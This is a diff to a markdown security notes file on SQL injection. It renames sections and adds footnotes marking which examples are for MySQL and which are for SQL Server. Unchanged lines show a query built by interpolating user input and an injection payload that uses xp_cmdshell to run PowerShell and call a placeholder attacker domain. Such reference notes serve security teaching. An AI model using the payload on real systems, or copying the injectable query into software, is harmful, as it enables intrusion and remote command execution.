@@ -1,15 +1,16 @@
 # SQL Injection
 
 ## Table of Contents
-- [Information Leakage](#information-leakage)
+
+- [Data Exfiltration](#data-exfiltration)
 - [Authentication Bypass](#authentication-bypass)
 - [RCE](#rce)
 
-## Information Leakage
+## Data Exfiltration
 
 ### It is possible to access data without the appropriate permissions.
 
-- Retrieving schema objects
+- Retrieving schema objects [^1]
     1. Query that fetches posts
         ```sql
         SELECT * FROM posts WHERE id = {user_input};
@@ -49,7 +50,7 @@
         ]
         ```
 
-- Reading file from the file system
+- Reading a file from the file system [^1]
     1. Query that fetches posts
         ```sql
         SELECT * FROM posts WHERE id = {user_input};
@@ -92,7 +93,7 @@
 
 ### Arbitrary commands can be executed remotely.
 
-- OAST
+- Executing OS commands [^2]
     1. Query that fetches posts
         ```sql
         SELECT * FROM posts WHERE id = {user_input};
@@ -101,3 +102,6 @@
         ```sql
         SELECT * FROM posts WHERE id = 1; EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri https://[ATTACKER-DOMAIN]/"';
         ```
+
+[^1]: Based on MySQL.
+[^2]: Based on Microsoft SQL Server.
